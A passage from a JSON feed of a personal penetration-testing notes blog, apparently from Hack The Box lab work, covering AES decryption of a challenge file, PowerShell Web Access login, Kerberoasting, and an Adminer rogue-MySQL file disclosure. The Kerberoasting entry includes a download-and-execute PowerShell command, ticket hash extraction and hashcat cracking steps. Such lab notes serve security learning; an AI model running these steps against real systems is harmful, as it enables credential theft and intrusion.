            "content_html": "<h2 id=\"overview\">Overview</h2><p>Here is an example steps on how to decrypt a file using AES by creating a decryption program based from the given encryption program.</p><h2 id=\"steps\">Steps</h2><p>In this box, there is a mail attachment (<code class=\"language-plaintext highlighter-rouge\">en.py</code>) containing parts of the code that was used to encrypt a message which is another attachment (<code class=\"language-plaintext highlighter-rouge\">enim_msg.txt</code>) on the email.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">def</span> <span class=\"nf\">encrypt</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">filename</span><span class=\"p\">):</span>    <span class=\"n\">chunksize</span> <span class=\"o\">=</span> <span class=\"mi\">64</span><span class=\"o\">*</span><span class=\"mi\">1024</span>    <span class=\"n\">outputFile</span> <span class=\"o\">=</span> <span class=\"s\">\"en\"</span> <span class=\"o\">+</span> <span class=\"n\">filename</span>    <span class=\"n\">filesize</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">getsize</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">)).</span><span class=\"n\">zfill</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"n\">IV</span> <span class=\"o\">=</span><span class=\"n\">Random</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">().</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"n\">encryptor</span> <span class=\"o\">=</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">MODE_CBC</span><span class=\"p\">,</span> <span class=\"n\">IV</span><span class=\"p\">)</span>    <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">infile</span><span class=\"p\">:</span>        <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">outputFile</span><span class=\"p\">,</span> <span class=\"s\">'wb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">outfile</span><span class=\"p\">:</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">filesize</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">IV</span><span class=\"p\">)</span>            <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>                <span class=\"n\">chunk</span> <span class=\"o\">=</span> <span class=\"n\">infile</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"n\">chunksize</span><span class=\"p\">)</span>                <span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"k\">break</span>                <span class=\"k\">elif</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"n\">chunk</span> <span class=\"o\">+=</span> <span class=\"sa\">b</span><span class=\"s\">' '</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span><span class=\"p\">))</span>                <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">encryptor</span><span class=\"p\">.</span><span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">))</span><span class=\"k\">def</span> <span class=\"nf\">getKey</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">):</span>            <span class=\"n\">hasher</span> <span class=\"o\">=</span> <span class=\"n\">SHA256</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"k\">return</span> <span class=\"n\">hasher</span><span class=\"p\">.</span><span class=\"n\">digest</span><span class=\"p\">()</span></code></pre></div></div><p>Obviously we need to modify this code to work properly. For example, the imports are missing. But before that, I tried to inspect the other attachment on how does it look like internally. I confirmed that the content is unreadable even when viewing in <code class=\"language-plaintext highlighter-rouge\">xxd</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>file enim_msg.txt enim_msg.txt: data<span class=\"nv\">$ </span>strings enim_msg.txt 0000000000000234YDo!<span class=\"nv\">$ </span></code></pre></div></div><p>Going back to the python code above, by doing static analysis, I can confirm that it accepts an input <code class=\"language-plaintext highlighter-rouge\">password</code>, then that password is turned into a SHA256 hash, then the hashed password is used as a key for AES CBC mode. The encryption is also done in 65536 bytes chunk as per <code class=\"language-plaintext highlighter-rouge\">chunksize = 64*1024</code> and put it into a file. At the beginning of the encrypted file, the program also put first the filesize with 0 paddings and IV, not sure though what’s the purpose of this.</p><p>I wanted to confirm my anlysis above so I modified the code and test by encrypting a file. The completed code now looks like:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">sys</span><span class=\"p\">,</span> <span class=\"n\">os</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Hash</span> <span class=\"kn\">import</span> <span class=\"n\">SHA256</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto</span> <span class=\"kn\">import</span> <span class=\"n\">Random</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Cipher</span> <span class=\"kn\">import</span> <span class=\"n\">AES</span><span class=\"n\">PASSWORD</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"n\">FILENAME</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"k\">def</span> <span class=\"nf\">encrypt</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">filename</span><span class=\"p\">):</span>    <span class=\"n\">chunksize</span> <span class=\"o\">=</span> <span class=\"mi\">64</span><span class=\"o\">*</span><span class=\"mi\">1024</span>    <span class=\"n\">outputFile</span> <span class=\"o\">=</span> <span class=\"s\">\"en\"</span> <span class=\"o\">+</span> <span class=\"n\">filename</span>    <span class=\"n\">filesize</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">getsize</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">)).</span><span class=\"n\">zfill</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"n\">IV</span> <span class=\"o\">=</span><span class=\"n\">Random</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">().</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">IV</span><span class=\"p\">)</span>    <span class=\"n\">encryptor</span> <span class=\"o\">=</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">MODE_CBC</span><span class=\"p\">,</span> <span class=\"n\">IV</span><span class=\"p\">)</span>    <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">infile</span><span class=\"p\">:</span>        <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">outputFile</span><span class=\"p\">,</span> <span class=\"s\">'wb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">outfile</span><span class=\"p\">:</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">filesize</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">IV</span><span class=\"p\">)</span>            <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>                <span class=\"n\">chunk</span> <span class=\"o\">=</span> <span class=\"n\">infile</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"n\">chunksize</span><span class=\"p\">)</span>                <span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"k\">break</span>                <span class=\"k\">elif</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">:</span>                    <span class=\"n\">chunk</span> <span class=\"o\">+=</span> <span class=\"sa\">b</span><span class=\"s\">' '</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span><span class=\"p\">))</span>                <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">encryptor</span><span class=\"p\">.</span><span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">))</span><span class=\"k\">def</span> <span class=\"nf\">getKey</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">):</span>            <span class=\"n\">hasher</span> <span class=\"o\">=</span> <span class=\"n\">SHA256</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>            <span class=\"k\">return</span> <span class=\"n\">hasher</span><span class=\"p\">.</span><span class=\"n\">digest</span><span class=\"p\">()</span><span class=\"n\">encrypt</span><span class=\"p\">(</span><span class=\"n\">getKey</span><span class=\"p\">(</span><span class=\"n\">PASSWORD</span><span class=\"p\">),</span> <span class=\"n\">FILENAME</span><span class=\"p\">)</span></code></pre></div></div><p>I tried to create a test file, encrypt it using the new code, and compared the  encrypted file to the mail attachment.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># create test file</span><span class=\"nb\">echo </span>hello <span class=\"o\">&gt;</span> test.txt<span class=\"c\"># encrypt file using new code</span>./en.py pass123 test.txt<span class=\"c\"># compare encrypted file to the encrypted attachment</span><span class=\"nv\">$ </span>strings enim_msg.txt 0000000000000234YDo!<span class=\"nv\">$ </span>strings entest.txt 0000000000000006<span class=\"nv\">$ </span></code></pre></div></div><p>There is a slight difference, I only see the filesize with paddings on the strings output. But anyway, looks like we are on correct track.</p><p>The next step I decided is to start building the decryption program based from the encryption program. Its almost similar to the encryption program with few differences:</p><ul>  <li>Use <code class=\"language-plaintext highlighter-rouge\">decryptor.decrypt</code> instead of <code class=\"language-plaintext highlighter-rouge\">decryptor.encrypt</code></li>  <li>I removed the writing of IV and filesize with padding on the output file</li>  <li>Some variable changes</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">sys</span><span class=\"p\">,</span> <span class=\"n\">os</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Hash</span> <span class=\"kn\">import</span> <span class=\"n\">SHA256</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto</span> <span class=\"kn\">import</span> <span class=\"n\">Random</span><span class=\"kn\">from</span> <span class=\"nn\">Crypto.Cipher</span> <span class=\"kn\">import</span> <span class=\"n\">AES</span><span class=\"n\">PASSWORD</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"n\">FILENAME</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"k\">def</span> <span class=\"nf\">decrypt</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">filename</span><span class=\"p\">):</span>  <span class=\"n\">chunksize</span> <span class=\"o\">=</span> <span class=\"mi\">64</span><span class=\"o\">*</span><span class=\"mi\">1024</span>  <span class=\"n\">outputFile</span> <span class=\"o\">=</span> <span class=\"s\">\"de\"</span> <span class=\"o\">+</span> <span class=\"n\">filename</span>   <span class=\"n\">filesize</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">getsize</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">)).</span><span class=\"n\">zfill</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>  <span class=\"n\">IV</span> <span class=\"o\">=</span><span class=\"n\">Random</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">().</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>  <span class=\"n\">decryptor</span> <span class=\"o\">=</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">MODE_CBC</span><span class=\"p\">,</span> <span class=\"n\">IV</span><span class=\"p\">)</span>  <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">,</span> <span class=\"s\">'rb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">infile</span><span class=\"p\">:</span>    <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">outputFile</span><span class=\"p\">,</span> <span class=\"s\">'wb'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">outfile</span><span class=\"p\">:</span>      <span class=\"c1\"># outfile.write(filesize.encode('utf-8'))</span>      <span class=\"c1\"># outfile.write(IV)</span>      <span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>        <span class=\"n\">chunk</span> <span class=\"o\">=</span> <span class=\"n\">infile</span><span class=\"p\">.</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"n\">chunksize</span><span class=\"p\">)</span>        <span class=\"k\">if</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">:</span>            <span class=\"k\">break</span>        <span class=\"k\">elif</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span><span class=\"p\">:</span>            <span class=\"n\">chunk</span> <span class=\"o\">+=</span> <span class=\"sa\">b</span><span class=\"s\">' '</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"p\">(</span><span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">)</span> <span class=\"o\">%</span> <span class=\"mi\">16</span><span class=\"p\">))</span>        <span class=\"n\">outfile</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">decryptor</span><span class=\"p\">.</span><span class=\"n\">decrypt</span><span class=\"p\">(</span><span class=\"n\">chunk</span><span class=\"p\">))</span>              <span class=\"k\">def</span> <span class=\"nf\">getKey</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">):</span>  <span class=\"n\">hasher</span> <span class=\"o\">=</span> <span class=\"n\">SHA256</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">password</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'utf-8'</span><span class=\"p\">))</span>  <span class=\"k\">return</span> <span class=\"n\">hasher</span><span class=\"p\">.</span><span class=\"n\">digest</span><span class=\"p\">()</span><span class=\"n\">decrypt</span><span class=\"p\">(</span><span class=\"n\">getKey</span><span class=\"p\">(</span><span class=\"n\">PASSWORD</span><span class=\"p\">),</span> <span class=\"n\">FILENAME</span><span class=\"p\">)</span></code></pre></div></div><p>I tried to run this against the decrypted test file I created and I was able to get the original data.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./de.py pass123 entest.txt  <span class=\"nv\">$ </span><span class=\"nb\">cat </span>deentest.txtk�Y���W3�B<span class=\"o\">}</span>���s�H                 <span class=\"o\">{</span>P��O<span class=\"k\">*</span>:hello          %                                                                                                  <span class=\"nv\">$ </span><span class=\"nv\">$ </span>strings deentest.txt            O<span class=\"k\">*</span>:hello          <span class=\"nv\">$ </span></code></pre></div></div><p>I was able to see the original data but there is some garbage. I’m sure I needed to do some changes on the decryption program but not sure on what part.</p><p>Having this problem, I tried first to use the decryption program against the encrypted attachment. Luckily, I know the password used because it was mentioned on the email body - it was same as the name of the recipient which is <code class=\"language-plaintext highlighter-rouge\">sahay</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./de.py sahay enim_msg.txt<span class=\"nv\">$ </span>strings deenim_msg.txt            sLPOSGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK      <span class=\"nv\">$ </span></code></pre></div></div><p>Doing a quick look at cyberchef using magic recipe, this is what I uncovered.</p><p><img src=\"/spindel/assets/Python%20AES%20Encryption%20and%20Decryption/8A8834E6-036B-479A-8BCA-BBB1DFD64A85.png\" alt=\"\" /></p><h2 id=\"better-solution\">Better solution</h2><p>I checked how different people did it. Here is from the official HTB walkthrough.</p><p><img src=\"/spindel/assets/Python%20AES%20Encryption%20and%20Decryption/798360A3-0518-4977-BF0E-A9AC702A25F2.png\" alt=\"\" /></p><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://raw.githubusercontent.com/mohamed1lar/Python-Scripts/master/crypto.py\">Looks like this is the original code where the program was based on</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/12/python-aes-encryption-and-decryption",
            
            
            
            "tags": ["python","crypto"],
            
            "date_published": "2022-04-12T00:00:00+08:00",
            "date_modified": "2022-04-12T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/10/powershell-web-access",
            "title": "Powershell Web Access",
            "summary": "Powershell Web Access",
            "content_text": "OverviewWeb-based powershell consoleInteresting URL Paths# login/remoteLogging in as local accountPrepend \\ or .\\ to be treated as local account instead of domain account.Or you can also use COMPUTER_NAME\\USER_NAME format.References  HTB Giddy",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Web-based powershell console</p><p><img src=\"/spindel/assets/Powershell%20Web%20Access/F6375AEF-BA00-4D83-9547-EB1F0F49D9E4.png\" alt=\"\" /></p><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># login</span><span class=\"w\"></span><span class=\"n\">/remote</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"logging-in-as-local-account\">Logging in as local account</h2><p>Prepend <code class=\"language-plaintext highlighter-rouge\">\\</code> or <code class=\"language-plaintext highlighter-rouge\">.\\</code> to be treated as local account instead of domain account.</p><p><img src=\"/spindel/assets/Powershell%20Web%20Access/935C5BE2-2EE2-47FA-B462-203F32529863.png\" alt=\"\" /></p><p>Or you can also use <code class=\"language-plaintext highlighter-rouge\">COMPUTER_NAME\\USER_NAME</code> format.</p><h2 id=\"references\">References</h2><ul>  <li>HTB Giddy</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/10/powershell-web-access",
            
            
            
            "tags": ["enum","windows","powershell","web"],
            
            "date_published": "2022-04-10T00:00:00+08:00",
            "date_modified": "2022-04-10T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/09/kerberoasting-using-powershell",
            "title": "Kerberoasting using Powershell",
            "summary": "Kerberoasting using Powershell",
            "content_text": "OverviewThis will request a service ticket for an account and acquire a hash using powershell.Requirement  You have access to the victim’s windows machine  Powershell is installedSteps  Extract SPNs (mapping between service and account)setspn -T medin -Q */*  Get powershell scriptiex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')  Run script and copy hash to attacker’s machineInvoke-Kerberoast -OutputFormat hashcat |fl  Sample output  Crack hash using hashcat (mode kerberos 5 TGS-REP etype 23)hashcat -m 13100 - a 0 hash.txt wordlist --forceAlternative  Kerberoasting - Red Teaming Experiments",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>This will request a service ticket for an account and acquire a hash using powershell.</p><h2 id=\"requirement\">Requirement</h2><ul>  <li>You have access to the victim’s windows machine</li>  <li>Powershell is installed</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Extract SPNs (mapping between service and account)</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">setspn</span><span class=\"w\"> </span><span class=\"nt\">-T</span><span class=\"w\"> </span><span class=\"nx\">medin</span><span class=\"w\"> </span><span class=\"nt\">-Q</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"nx\">/</span><span class=\"o\">*</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Get powershell script</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">iex</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"n\">New-Object</span><span class=\"w\"> </span><span class=\"nx\">Net.WebClient</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"nf\">DownloadString</span><span class=\"p\">(</span><span class=\"s1\">'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'</span><span class=\"p\">)</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Run script and copy hash to attacker’s machine</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Invoke-Kerberoast</span><span class=\"w\"> </span><span class=\"nt\">-OutputFormat</span><span class=\"w\"> </span><span class=\"nx\">hashcat</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"n\">fl</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Sample output</li></ul><p><img src=\"/spindel/assets/Kerberoasting%20using%20Powershell/X2lGkzF.png\" alt=\"\" /></p><ul>  <li>Crack hash using hashcat (mode kerberos 5 TGS-REP etype 23)</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>hashcat <span class=\"nt\">-m</span> 13100 - a 0 hash.txt wordlist <span class=\"nt\">--force</span></code></pre></div></div><h2 id=\"alternative\">Alternative</h2><ul>  <li><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting\">Kerberoasting - Red Teaming Experiments</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/09/kerberoasting-using-powershell",
            
            
            
            "tags": ["foothold","windows","ad","kerberos","powershell"],
            
            "date_published": "2022-04-09T00:00:00+08:00",
            "date_modified": "2022-04-09T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
            "title": "Adminer File Disclosure",
            "summary": "Adminer File Disclosure",
            "content_text": "OverviewAttacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.Protocol Flaw in MySQL  The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)Steps  Update rogue_mysql_server.py with the file you want to read and run itcd ~/data/toolscat rogue_mysql_server.py | egrep 'filename ='python2 rogue_mysql_server.py  Open wireshark and filter mysql packets  Login to adminer and point it to attacker rogue mysql. The rest can be any value.  Go back to wire shark and check the mysql response from victim.References  PHP tool ‘Adminer’ leaks passwords – Sansec  Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit  Alternative to the above - much easier to use",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>Attacker can point adminer into a rogue mysql server to get access to internal files inside the victim machine.</p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EF3B2DBA-F55A-487A-A698-BB47C683143C.png\" alt=\"\" /></p><h1 id=\"protocol-flaw-in-mysql\">Protocol Flaw in MySQL</h1><blockquote>  <p>The transfer of the file from the client host to the server host is initiated by the MySQL server. In theory, a patched server could be built that would tell the client program to transfer a file of the server’s choosing rather than the file named by the client in the LOAD DATA statement. Such a server could access any file on the client host to which the client user has read access. (A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.)</p></blockquote><h1 id=\"steps\">Steps</h1><ul>  <li>Update <code class=\"language-plaintext highlighter-rouge\">rogue_mysql_server.py</code> with the file you want to read and run it</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cd</span> ~/data/tools<span class=\"nb\">cat </span>rogue_mysql_server.py | egrep <span class=\"s1\">'filename ='</span>python2 rogue_mysql_server.py</code></pre></div></div><ul>  <li>Open wireshark and filter mysql packets</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/EA76910F-225D-4CD4-AA58-A0B7B73F1FFC.png\" alt=\"\" /></p><ul>  <li>Login to adminer and point it to attacker rogue mysql. The rest can be any value.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/2C2CD67E-0CD7-40AC-B898-E61DEF389D83.png\" alt=\"\" /></p><ul>  <li>Go back to wire shark and check the mysql response from victim.</li></ul><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0EE58AEE-B02F-4189-8DCF-96A72324C37B.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Adminer%20File%20Disclosure/0B1373DE-095F-440A-ACBF-62BC821E42DC.png\" alt=\"\" /></p><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability\">PHP tool ‘Adminer’ leaks passwords – Sansec</a></li>  <li><a href=\"https://www.exploit-db.com/exploits/43593\">Adminer 4.3.1 - Server-Side Request Forgery - PHP webapps Exploit</a></li>  <li><a href=\"https://podalirius.net/en/cves/2021-xxxxx/\">Alternative to the above</a> - much easier to use</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/08/adminer-file-disclosure",
            
            
            
            "tags": ["lfi","enum","foothold"],
            
            "date_published": "2022-04-08T00:00:00+08:00",
            "date_modified": "2022-04-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
